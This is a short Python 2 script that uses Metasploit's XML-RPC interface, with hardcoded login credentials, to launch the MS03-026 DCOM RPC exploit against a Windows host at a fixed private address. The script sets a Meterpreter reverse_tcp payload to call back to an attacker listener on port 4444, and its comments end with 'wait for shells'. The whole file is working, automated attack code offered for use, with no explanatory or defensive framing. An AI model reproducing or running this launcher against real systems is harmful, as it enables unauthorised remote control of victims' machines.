##
## 1) ./msfconsole
## 2) load xmlrpc Pass=<password>
## 3) run script
## 4) wait for shells

import xmlrpclib
from MSFTransport import MSFTransport
msftransport = MSFTransport()
proxy = xmlrpclib.ServerProxy("http://localhost:55553", transport=msftransport)

ret = proxy.auth.login("msf","abc123")
if ret['result'] == 'success':
	token = ret['token']
else:
	print "Could not login\n"

opts = {
	"RHOST" : "192.168.1.1",
	"LHOST" : "192.168.1.101",
	"LPORT" : 4444,
	"PAYLOAD": "windows/meterpreter/reverse_tcp"} 
ret = proxy.module.execute(token,"exploit","windows/dcerpc/ms03_026_dcom",opts)
if(ret['result'] == 'success'):
	print "Exploit launched\n"
